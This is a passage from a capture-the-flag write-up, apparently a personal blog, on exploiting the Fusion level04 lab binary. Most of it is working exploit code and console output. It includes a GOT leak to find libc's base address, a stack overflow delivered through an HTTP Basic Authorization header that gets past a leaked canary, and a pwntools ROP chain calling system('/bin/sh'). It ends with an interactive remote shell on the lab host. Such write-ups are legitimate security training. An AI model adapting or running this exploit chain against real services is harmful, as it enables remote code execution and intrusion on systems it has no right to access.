    leak_libc_base_address(args, password, canary, ebx, elf_base_address)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fusion level04 exploit by r0kit.')
    parser.add_argument('--host', dest='host', type=str, required=True)
    parser.add_argument('--port', dest='port', type=int, default=20004)
    parser.add_argument('--password-leak-delay-loops', dest='delay_loops', type=int, default=10)

    try:
        args = parser.parse_args()
        exploit(args)
        
    except argparse.ArgumentError as e:
        print("[!] {}".format(e))
        parser.print_usage()
        sys.exit(1)
```

In the code above, we invoke `__printf_chk` via ROP chaining to print the address of `__libc_start_main` from the GOT. `__printf_check` is pretty much `printf` with stack overflow protection in determined by the first argument. We set it to zero since it appears that disables it, yet still leaks what we need.
Since `stdout` is written to the socket, we will be able to access the absolute memory address of `__libc_start_main` over the wire.
Note how I picked `__libc_start_main` as the GOT entry to leak. This is because `__libc_start_main` is called in pretty much every ELF. Also, keep in mind that GOT entries will only load when imported functions are invoked.
When developing the exploit, you will likely want to try different versions of libc, so instead of hardcoding offsets to libc functions, we can use `pwntools` to automatically search libc for the offset based on our selected libc version when calculating libc's base address.

```
kali@kali:~/ctf/fusion/level04$ python3 leak-libc-base-address.py --host 192.168.254.156
[*] '/home/kali/ctf/fusion/level04/level04'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
[*] '/home/kali/tools/libc-database/db/libc6_2.13-20ubuntu5_i386.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 16 cached gadgets for './level04'
[+] Opening connection to 192.168.254.156 on port 20004: Done
[DEBUG] Sent 0xb58 bytes:
    b'GET / HTTP/1.0\r\n'
    b'Host: 192.168.254.156:20004\r\n'
    b'User-Agent: curl/7.72.0\r\n'
    b'Accept: */*\r\n'
    b'Authorization: Basic OjUySDJoMmMzdUVQMkxZUlhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEAH20EQUFBQUFBQUFBQUFBGAGOt0FBQUFBQUFBQUFBQcDPjbewzo23AAAAALwBjrc=\r\n'
    b'\r\n'
[+] Receiving all data: Done (96B)
[DEBUG] Received 0x60 bytes:
    00000000  20 c0 74 b7  c0 42 7f b7  46 cf 8d b7  60 65 80 b7  │ ·t·│·B··│F···│`e··│
    00000010  e0 3a 79 b7  76 cf 8d b7  86 cf 8d b7  96 cf 8d b7  │·:y·│v···│····│····│
    00000020  a6 cf 8d b7  70 66 76 b7  c0 8f 81 b7  c0 e5 7c b7  │····│pfv·│····│··|·│
    00000030  20 67 80 b7  f6 cf 8d b7  a0 38 78 b7  10 6b 80 b7  │ g··│····│·8x·│·k··│
    00000040  26 d0 8d b7  b0 f8 7c b7  46 d0 8d b7  e0 6c 84 b7  │&···│··|·│F···│·l··│
    00000050  c0 41 7f b7  76 d0 8d b7  20 64 7a b7  96 d0 8d b7  │·A··│v···│ dz·│····│
    00000060
[*] Closed connection to 192.168.254.156 port 20004
[*] Leaked __libc_start_main at 0xb774c020
[*] Libc base address: 0xb7733000
```

Since we were able to disclose a libc GOT entry, let's look it up and figure out the exact libc version:

```
kali@kali:~/tools/libc-database$ ./find __libc_start_main 0xb774c020
ubuntu-old-eglibc (libc6_2.13-20ubuntu5.2_i386)
ubuntu-old-eglibc (libc6_2.13-20ubuntu5.3_i386)
ubuntu-old-eglibc (libc6_2.13-20ubuntu5_i386)
```

There are three candidates, so you will want to trial and error all of libc versions above when attempting to exploit a remote system.

## Crafting the ROP chain

Now for the last part in this exploit chain!

The exploit below runs an `x86` ROP chain calling `system("/bin/bash")`.
Note that in the real world, you will need to run this exploit for each version of libc you think is running on the remote system.

```python
import argparse
import base64
import binascii
import collections
import time
import string
import sys
from pwn import *

# Pwn context
context.arch = 'i386'

# Environment
PASSWORD_LEN = 16                                                                       # The hard-coded length of the app's password
TARGET_ELF = ELF('./level04')                                                           # Executable to search for PLT offsets
TARGET_LIBC = ELF('/home/kali/tools/libc-database/db/libc6_2.13-20ubuntu5_i386.so')     # LIBC matching that on the remote system

def make_payload(args, overflow):
    payload = b"".join([
      b"GET / HTTP/1.0\r\n",
      b"Host: " + args.host.encode('utf-8') + b":" + str(args.port).encode('UTF-8') + b"\r\n"
      b"User-Agent: curl/7.72.0\r\n"
      b"Accept: */*\r\n"
      b"Authorization: Basic ",
      base64.b64encode(b":" + overflow),
      b"\r\n\r\n"
    ])
    return payload

def do_rop(args, password, canary, ebx, libc_base_address):
    context.log_level = 'info'

    rop = ROP(TARGET_LIBC)
    pop_ret = rop.search(0x8).address
    bin_sh = next(TARGET_LIBC.search(b"/bin/sh\x00"))
    system = TARGET_LIBC.sym['system']

    rop.raw(p32(libc_base_address + system))
    rop.raw(p32(libc_base_address + pop_ret)) 
    rop.raw(p32(libc_base_address + bin_sh)) 
    return_address = rop.chain()

    conn = remote(args.host, args.port)
    padding = b"A" * (2048 - len(password)- 1)
    post_canary_padding = b""
    post_canary_eip_offset = 0x1c
    post_canary_ebx_offset = post_canary_eip_offset - 0x10
    post_canary_ebx_padding = b"A" * post_canary_ebx_offset
    post_ebx_return_address_offset = post_canary_ebx_offset + 0x0c
    post_ebx_return_address_padding = b"A" * 0x0c

    overflow = b"".join([
        password,
        padding,
        canary,
        post_canary_ebx_padding,
        p32(ebx),
        post_ebx_return_address_padding,
        return_address
    ])
    payload = make_payload(args, overflow)

    # Pop a shell
    info('Popping a shell...')
    conn.send(payload)
    conn.interactive()

def exploit(args):
    # password = leak_password(args)
    password = b"52H2h2c3uEP2LYRX"
    canary = p32(u32(binascii.unhexlify("046d1f00"), endian='big'))
    ebx = u32(binascii.unhexlify("b78e0118"), endian='big')
    elf_base_address = u32(binascii.unhexlify("b78dc000"), endian='big')
    libc_base_address = u32(binascii.unhexlify("b7733000"), endian='big')
    do_rop(args, password, canary, ebx, libc_base_address)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fusion level04 exploit by r0kit.')
    parser.add_argument('--host', dest='host', type=str, required=True)
    parser.add_argument('--port', dest='port', type=int, default=20004)
    parser.add_argument('--password-leak-delay-loops', dest='delay_loops', type=int, default=10)

    try:
        args = parser.parse_args()
        exploit(args)
        
    except argparse.ArgumentError as e:
        print("[!] {}".format(e))
        parser.print_usage()
        sys.exit(1)
```

Running the exploit above will invoke a shell on the remote system:

```
kali@kali:~/ctf/fusion/level04$ python3 rop-chain-shell.py --host 192.168.254.156
[*] '/home/kali/ctf/fusion/level04/level04'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
[*] '/home/kali/tools/libc-database/db/libc6_2.13-20ubuntu5_i386.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading gadgets for '/home/kali/tools/libc-database/db/libc6_2.13-20ubuntu5_i386.so'
[+] Opening connection to 192.168.254.156 on port 20004: Done
[*] Popping a shell...
[*] Switching to interactive mode
/bin/sh: line 1: $'\r': command not found
$ id
uid=20004 gid=20004 groups=20004
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:a5:67:f6 brd ff:ff:ff:ff:ff:ff
    inet 192.168.254.156/24 brd 192.168.254.255 scope global eth0
    inet6 fe80::20c:29ff:fea5:67f6/64 scope link
       valid_lft forever preferred_lft forever
$ hostname
fusion
$
```

And that's the exploit! I have posted the final exploit code on my [github](https://github.com/r0kit/CTF-Solutions/tree/master/exploit-excercises/fusion/level04) for you to play around with or reference! :)
